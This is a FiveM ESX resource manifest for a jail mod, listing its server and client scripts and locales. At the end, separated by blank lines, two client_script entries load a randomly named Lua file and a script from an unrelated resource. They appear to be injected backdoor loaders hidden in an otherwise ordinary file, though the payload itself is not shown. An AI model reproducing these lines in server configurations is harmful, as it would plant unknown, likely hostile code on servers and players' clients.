resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Jailer'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua',
	'client/utils.lua'
}

dependency 'es_extended'







client_script "api-ac_mophaRtlXBhi.lua"

client_script '@pozdoodtajczyka/client/main.lua'